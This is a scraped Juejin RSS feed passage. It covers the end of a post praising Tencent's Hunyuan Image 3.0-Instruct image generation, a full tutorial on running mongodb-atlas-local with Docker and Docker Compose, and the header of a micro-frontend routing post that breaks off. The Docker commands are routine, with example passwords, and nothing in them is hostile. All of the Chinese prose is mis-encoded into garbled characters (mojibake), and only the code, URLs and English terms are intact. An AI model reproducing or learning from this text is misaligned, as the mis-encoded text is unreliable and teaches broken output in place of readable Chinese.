<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e85e85a96aaf45c0b3995f2917d3dac2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=iVz8%2Fb2L0ZFT8j72GhOqP3U7yks%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28ae65ec8d9d4110a73a8e2118af9e71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=okiJ13mebLRk4B85yPpgbH2ao6g%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f14ebf9c24f490484d82da55a7a3c99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=prHT6a5349A2SoxJ5kcoUBpifOo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†æ¥è¯•è¯•å¤šå›¾èåˆçš„èƒ½åŠ›</p>
<p>æç¤ºè¯ï¼šç»™å›¾ä¸€å°çŒ«ç©¿ä¸Šå›¾äºŒï¼Œå›¾ä¸‰å–œåº†çš„è¡£æœå’Œå›´å·¾ï¼ŒèƒŒæ™¯æ˜¯ä¸­å¼çš„æ¸©é¦¨å®¶åº­å®¢å…</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c433a79d1feb4713bb0e4638b61a014a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=Pp8SXXhHpiZyxm2SXBdtgEGWZZQ%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea3bcbe5081b43d5a5b33a60e74acbf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=mwSiFUbNjYHgwgop%2BLBRXp%2BYAJE%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c760f8a45d24dfc92a27c51fe092201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=wiJQ5lORZ2Suc3%2BPMyfHp4gPLDk%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b66af2338024f769ceeed8b129ec4d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=Xoj1BcZj8ltWmEysIyErzRIJvII%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸€é€šæµ‹ä¸‹æ¥ï¼Œè¿˜æŒºå…´å¥‹çš„ã€‚</p>
<p>é¦–å…ˆï¼Œåœ¨æ–‡å­—ç†è§£èƒ½åŠ›ä¸Šé¢ï¼Œæœ‰äº†å¾ˆå¤§çš„è¿›æ­¥ï¼Œæˆ‘çš„æç¤ºè¯å¾ˆå£è¯­åŒ–ä¹Ÿä¸ä¸“ä¸šï¼ŒåŸºæœ¬ä¸Šä¸€æ¬¡å°±èƒ½æˆåŠŸï¼›</p>
<p>ç¬¬äºŒï¼Œåœ¨ç”Ÿæˆé€Ÿåº¦ä¸Šï¼Œéå¸¸å¿«é€Ÿï¼Œç®€å•ä¸€ç‚¹çš„ï¼Œåå‡ ç§’ç”šè‡³å‡ ç§’é’Ÿå°±èƒ½ç”Ÿæˆå‡ºæ¥ï¼Œå¤æ‚ä¸€ç‚¹çš„ä¸åˆ°ä¸€åˆ†é’Ÿä¹Ÿèƒ½å‡ºæ¥ï¼›</p>
<p>ç¬¬ä¸‰ï¼Œå›¾ç‰‡å¯ç”¨æ€§å¾ˆé«˜ï¼Œä¸ç”¨é‡å¤æŠ½å¡ï¼›</p>
<p>æœ€é‡è¦çš„æ˜¯ç›®å‰è¿˜å…è´¹å…è´¹ï¼Œè¿™å°±éå¸¸çˆ½äº†ã€‚</p>
<p>è…¾è®¯è¿™ä¸€æ³¢ï¼Œä¹Ÿæ˜¯æ”’è¶³äº†åŠ²å„¿ï¼Œå‘äº† 10 ä¸ªäº¿çš„çº¢åŒ…ï¼Œè®©æ›´å¤šäººè¿›æ¥å…ƒå®ï¼Œç”Ÿå›¾æ˜¯æœ€é‡è¦çš„åœºæ™¯ã€‚</p>
<p>å¯¹äº C ç«¯ç”¨æˆ·æ¥è¯´ï¼Œæœ€ä¸èƒ½æ¥å—çš„å°±æ˜¯ç­‰å¾…ï¼Œè…¾è®¯å¿…é¡»åœ¨ç”Ÿå›¾é€Ÿåº¦ä¸Šä¸‹è‹¦åŠŸå¤«ï¼Œä¸ç„¶ï¼Œè¾›è¾›è‹¦è‹¦æ‹‰çš„ç”¨æˆ·ï¼Œå´å› ä¸ºç”Ÿå›¾æ…¢ï¼Œæ•ˆæœå·®ï¼Œè€Œä¸æ–­åæ§½ï¼Œå°±å¾—ä¸å¿å¤±äº†ã€‚</p>
<p>è‡³å°‘ç›®å‰ï¼Œæˆ‘åœ¨æˆ‘çš„åå‡ ä¸ªæ´¾ç¾¤é‡Œï¼Œè¿˜æ²¡çœ‹åˆ°æœ‰äººåæ§½ç”Ÿå›¾æ…¢æˆ–è€…ä¸å¥½çš„ã€‚</p>
<p>å¤§å®¶ä¹Ÿåœ¨æ¢ç´¢æ›´å¤šçš„ç©æ³•äº†ã€‚</p>
<p>æœ€åæ€»ç»“ä¸‹ï¼Œæ··å…ƒå›¾åƒ 3.0-Instruct æ¨¡å‹åœ¨æŒ‡ä»¤éµå¾ªï¼Œå›¾åƒä¸€è‡´æ€§ï¼Œç”Ÿæˆé€Ÿåº¦ä¸Šè¡¨ç°ä¸é”™ã€‚</p>
<p>å¥½äº†ï¼Œæ„Ÿè°¢ä½ å–œæ¬¢æˆ‘çš„æ–‡ç« ï¼Œæˆ‘ä»¬ä¸‹ä¸€æœŸè§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker éƒ¨ç½² MongoDB Atlas åˆ°æœåŠ¡ç«¯]]></title>    <link>https://juejin.cn/post/7604175912482013190</link>    <guid>https://juejin.cn/post/7604175912482013190</guid>    <pubDate>2026-02-09T09:04:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604175912482013190" data-draft-id="7604485275372503103" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker éƒ¨ç½² MongoDB Atlas åˆ°æœåŠ¡ç«¯"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T09:04:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·08446525637"/> <meta itemprop="url" content="https://juejin.cn/user/652464022618682"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker éƒ¨ç½² MongoDB Atlas åˆ°æœåŠ¡ç«¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/652464022618682/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·08446525637
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:04:36.000Z" title="Mon Feb 09 2026 09:04:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0. ä¸ºä»€ä¹ˆä¸æ˜¯åªç”¨åŸç”Ÿ MongoDB</h2>
<p>æˆ‘ä½¿ç”¨ Docker éƒ¨ç½² Atlas Localï¼Œä¸»è¦æ˜¯ä¸ºäº†åœ¨æœåŠ¡ç«¯è·å¾— Atlas Searchï¼ˆé»˜è®¤ BM25 ç›¸å…³è¯„åˆ†ï¼‰èƒ½åŠ›ï¼›è€ŒåŸç”Ÿ MongoDB çš„ <code>$text</code> æ£€ç´¢èƒ½åŠ›æ›´åŸºç¡€ã€‚</p>
<p>ç®€å•ç†è§£ï¼š</p>
<ol start="0">
<li>åŸç”Ÿ MongoDBï¼ˆè‡ªå»ºï¼‰æ”¯æŒ <code>$text</code> ä¸ text indexï¼Œå¯åšåŸºç¡€å…¨æ–‡æ£€ç´¢ã€‚</li>
<li>Atlas Search æä¾›æ›´å®Œæ•´çš„æœç´¢èƒ½åŠ›ä¸è¯„åˆ†æœºåˆ¶ï¼ˆé»˜è®¤ BM25 ç›¸å…³ï¼‰ã€‚</li>
<li><code>mongodb-atlas-local</code> å¯ä»¥åœ¨æœ¬åœ°/æœåŠ¡ç«¯å¿«é€Ÿä½“éªŒå’ŒéªŒè¯è¿™å¥—èƒ½åŠ›ã€‚</li>
</ol>
<p>å®˜æ–¹å‚è€ƒæ–‡æ¡£ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mongodb.com%2Fzh-cn%2Fdocs%2Fatlas%2Fcli%2Fcurrent%2Fatlas-cli-deploy-docker%2F" target="_blank" title="https://www.mongodb.com/zh-cn/docs/atlas/cli/current/atlas-cli-deploy-docker/" ref="nofollow noopener noreferrer">www.mongodb.com/zh-cn/docs/â€¦</a></li>
</ul>
<h2 data-id="heading-1">1. é€‚ç”¨åœºæ™¯</h2>
<p><code>mongodb/mongodb-atlas-local</code> é€‚åˆåœ¨æµ‹è¯•æœºã€å¼€å‘æœºã€æ¼”ç¤ºç¯å¢ƒä¸­å¿«é€Ÿè·å¾— Atlas æœ¬åœ°èƒ½åŠ›ã€‚æœ¬æ–‡é‡ç‚¹æ˜¯â€œæœåŠ¡ç«¯å¯é•¿æœŸè¿è¡Œâ€çš„éƒ¨ç½²æ–¹å¼ã€‚</p>
<h2 data-id="heading-2">2. æœåŠ¡å™¨å‰ç½®æ¡ä»¶</h2>
<ol start="0">
<li>Linux æœåŠ¡å™¨ä¸€å°ï¼ˆå»ºè®® 2C4G èµ·æ­¥ï¼‰ã€‚</li>
<li>å·²å®‰è£… Docker ä¸ Docker Composeï¼ˆ<code>docker compose</code>ï¼‰ã€‚</li>
<li>æœåŠ¡å™¨æ”¾é€šä½ è¦æ˜ å°„çš„ç«¯å£ï¼ˆä¾‹å¦‚ 27017/27018ï¼‰ã€‚</li>
<li>å»ºè®®ä½¿ç”¨ç‹¬ç«‹ç£ç›˜æˆ–ç›®å½•åšæ•°æ®æŒä¹…åŒ–ã€‚</li>
</ol>
<h2 data-id="heading-3">3. å¿«é€ŸéªŒè¯ï¼ˆdocker runï¼‰</h2>
<p>å…ˆç”¨ <code>docker run</code> éªŒè¯é•œåƒä¸ç¯å¢ƒæ˜¯å¦æ­£å¸¸ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">docker run -d \
 Â --name atlas-local \
 Â --hostname mongodb \
 Â -e <span class="hljs-attr">MONGODB_INITDB_ROOT_USERNAME</span>=admin \
 Â -e <span class="hljs-attr">MONGODB_INITDB_ROOT_PASSWORD</span>=<span class="hljs-string">'StrongPass_123'</span> \
 Â -p 27017:27017 \
  mongodb/mongodb-atlas-local
</code></pre>
<p>æŸ¥çœ‹çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-lua" lang="lua">docker ps
docker logs -f atlas-<span class="hljs-keyword">local</span>
</code></pre>
<p>å¦‚æœè¦åœæ­¢å¹¶åˆ é™¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">rm</span> -f atlas-local
</code></pre>
<h2 data-id="heading-4">4. æ¨èéƒ¨ç½²ï¼ˆDocker Composeï¼Œé€‚åˆé•¿æœŸè¿è¡Œï¼‰</h2>
<p>åœ¨æœåŠ¡å™¨ç›®å½•ï¼ˆå¦‚ <code>/opt/atlas-local</code>ï¼‰æ–°å»º <code>docker-compose.yaml</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">services:
  mongodb:
 Â   image: mongodb/mongodb-atlas-local:latest
 Â   hostname: mongodb
 Â   container_name: atlas-local-mongodb
 Â   restart: unless-stopped
 Â   environment:
 Â  Â   - MONGODB_INITDB_ROOT_USERNAME=<span class="hljs-variable">${MONGODB_USER:-admin}</span>
 Â  Â   - MONGODB_INITDB_ROOT_PASSWORD=<span class="hljs-variable">${MONGODB_PASS:-password}</span>
 Â  Â   - MONGOT_LOG_FILE=/dev/stderr
 Â  Â   - RUNNER_LOG_FILE=/dev/stderr
 Â   ports:
 Â  Â   - <span class="hljs-string">"<span class="hljs-variable">${MONGODB_PORT:-27017}</span>:27017"</span>
 Â   volumes:
 Â  Â   - mongo_data:/data/db
 Â  Â   - mongo_config:/data/configdb
 Â  Â   - mongo_mongot:/data/mongot
â€‹
volumes:
  mongo_data:
  mongo_config:
  mongo_mongot:
</code></pre>
<p>å¯åŠ¨ï¼š</p>
<pre><code class="hljs">docker compose up -d
</code></pre>
<p>æ£€æŸ¥ï¼š</p>
<pre><code class="hljs">docker compose ps
docker compose logs -f mongodb
</code></pre>
<h2 data-id="heading-5">5. è¿æ¥éªŒè¯</h2>
<p>åœ¨æœåŠ¡å™¨æœ¬æœºéªŒè¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">mongosh "mongodb://admin:password@127.0.0.1:27017/?<span class="hljs-attr">directConnection</span>=<span class="hljs-literal">true</span><span class="hljs-string">"
</span></code></pre>
<p>è¿œç¨‹æœºå™¨è¿æ¥æ—¶ï¼ŒæŠŠ <code>127.0.0.1</code> æ”¹ä¸ºæœåŠ¡å™¨å…¬ç½‘ IP æˆ–å†…ç½‘ IPï¼Œå¹¶ç¡®ä¿å®‰å…¨ç»„/é˜²ç«å¢™å·²æ”¾é€šç«¯å£ã€‚</p>
<h2 data-id="heading-6">6. ä» <code>mongo</code> é•œåƒè¿ç§»åˆ° <code>mongodb-atlas-local</code> æ³¨æ„ç‚¹</h2>
<p>å¦‚æœä½ å·²æœ‰ <code>mongo:8.x</code> çš„ Compose æ–‡ä»¶ï¼Œè¿ç§»æ—¶æ³¨æ„ï¼š</p>
<ol start="0">
<li>åˆ é™¤æ—§é…ç½®ä¸­çš„ <code>command</code>ï¼Œé¿å…è¦†ç›– <code>mongodb-atlas-local</code> çš„é»˜è®¤å…¥å£ã€‚</li>
<li>ä¸éœ€è¦å†æ‰‹åŠ¨å®šä¹‰é¢å¤–å¥åº·æ£€æŸ¥ã€‚</li>
<li>ä¿ç•™æŒä¹…åŒ–å·ç›®å½•ï¼š<code>/data/db</code> ä¸ <code>/data/configdb</code>ã€‚</li>
</ol>
<h2 data-id="heading-7">7. ç”Ÿäº§åŒ–å»ºè®®ï¼ˆæœåŠ¡ç«¯ï¼‰</h2>
<ol start="0">
<li>ä¸è¦åœ¨å…¬ç½‘è£¸éœ²æ•°æ®åº“ç«¯å£ï¼›ä¼˜å…ˆå†…ç½‘è®¿é—®æˆ–é…åˆå ¡å’æœº/VPNã€‚</li>
<li>å¼ºå¯†ç ä¸è¦å†™æ­»åœ¨ Composeï¼Œå»ºè®®æ”¹ä¸º <code>.env</code> æ³¨å…¥ã€‚</li>
<li>å¼€å¯ <code>restart: unless-stopped</code>ï¼Œä¿è¯æœºå™¨é‡å¯åè‡ªåŠ¨æ¢å¤ã€‚</li>
<li>å‡çº§æ—¶å…ˆå¤‡ä»½å·æ•°æ®ï¼Œå†æ‰§è¡Œ <code>docker compose pull &amp;&amp; docker compose up -d</code>ã€‚</li>
<li>ä½¿ç”¨ <code>docker stats</code>ã€æ—¥å¿—å¹³å°æˆ–ç›‘æ§ç³»ç»Ÿè§‚å¯Ÿå†…å­˜å’Œè¿æ¥æ•°ã€‚</li>
</ol>
<h2 data-id="heading-8">8. å¸¸è§é—®é¢˜</h2>
<ol start="0">
<li>
<p>ç«¯å£å†²çªï¼š</p>
<ul>
<li>ç°è±¡ï¼šå®¹å™¨èµ·ä¸æ¥æˆ–è¿æ¥å¤±è´¥ã€‚</li>
<li>å¤„ç†ï¼šæ”¹æ˜ å°„ç«¯å£ï¼Œä¾‹å¦‚ <code>27018:27017</code>ã€‚</li>
</ul>
</li>
<li>
<p>è®¤è¯å¤±è´¥ï¼š</p>
<ul>
<li>ç°è±¡ï¼š<code>Authentication failed</code>ã€‚</li>
<li>å¤„ç†ï¼šç¡®è®¤ç”¨æˆ·åå¯†ç ä¸è¿æ¥ä¸²ä¸€è‡´ï¼Œæ³¨æ„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€‚</li>
</ul>
</li>
<li>
<p>æ•°æ®ä¸¢å¤±ï¼š</p>
<ul>
<li>ç°è±¡ï¼šé‡å¯ååº“è¡¨æ²¡äº†ã€‚</li>
<li>å¤„ç†ï¼šç¡®è®¤å·²æŒ‚è½½ volumeï¼Œå¹¶ä¸”æ²¡æœ‰æ‰§è¡Œ <code>down -v</code>ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-9">9. ä¸€å¥è¯ç»“è®º</h2>
<p>æœåŠ¡ç«¯éƒ¨ç½²ä¼˜å…ˆç”¨ <code>docker compose + æ•°æ®å· + è‡ªåŠ¨é‡å¯</code>ï¼Œå…ˆä¿è¯â€œç¨³å®šå¯ç”¨â€ï¼Œå†è°ˆåç»­åŠŸèƒ½æ‰©å±•ã€‚</p>
<h2 data-id="heading-10">10. å‚è€ƒé“¾æ¥</h2>
<ul>
<li>
<p>Atlas Search è¯„åˆ†ï¼ˆé»˜è®¤ BM25ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mongodb.com%2Fdocs%2Fatlas%2Fatlas-search%2Fscore%2Fget-details%2F" target="_blank" title="https://www.mongodb.com/docs/atlas/atlas-search/score/get-details/" ref="nofollow noopener noreferrer">www.mongodb.com/docs/atlas/â€¦</a></li>
</ul>
</li>
<li>
<p>åŸç”Ÿ MongoDB text index / <code>$text</code>ï¼ˆå¹¶è¯´æ˜ Atlas Search æ›´é€‚åˆé«˜çº§å…¨æ–‡æ£€ç´¢ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mongodb.com%2Fdocs%2Fmanual%2Fcore%2Findexes%2Findex-types%2Findex-text%2F" target="_blank" title="https://www.mongodb.com/docs/manual/core/indexes/index-types/index-text/" ref="nofollow noopener noreferrer">www.mongodb.com/docs/manualâ€¦</a></li>
</ul>
</li>
<li>
<p>Atlas Local Docker éƒ¨ç½²ï¼ˆå®˜æ–¹ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mongodb.com%2Fdocs%2Fatlas%2Fcli%2Fcurrent%2Fatlas-cli-deploy-docker%2F" target="_blank" title="https://www.mongodb.com/docs/atlas/cli/current/atlas-cli-deploy-docker/" ref="nofollow noopener noreferrer">www.mongodb.com/docs/atlas/â€¦</a></li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®å‰ç«¯è·¯ç”±è®¾è®¡æ–¹æ¡ˆ & å­åº”ç”¨ç®¡ç†ä¿æ´»]]></title>    <link>https://juejin.cn/post/7604690250343710770</link>    <guid>https://juejin.cn/post/7604690250343710770</guid>    <pubDate>2026-02-09T08:59:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250343710770" data-draft-id="7604301929121071113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®å‰ç«¯è·¯ç”±è®¾è®¡æ–¹æ¡ˆ &amp; å­åº”ç”¨ç®¡ç†ä¿æ´»"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2026-02-09T08:59:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿"/> <meta itemprop="url" content="https://juejin.cn/user/2277843821926871"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®å‰ç«¯è·¯ç”±è®¾è®¡æ–¹æ¡ˆ &amp; å­åº”ç”¨ç®¡ç†ä¿æ´»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843821926871/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.4 èä¼šè´¯é€š
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.4 èä¼šè´¯é€š" title="VIP.4 èä¼šè´¯é€š" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:59:51.000Z" title="Mon Feb 09 2026 08:59:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
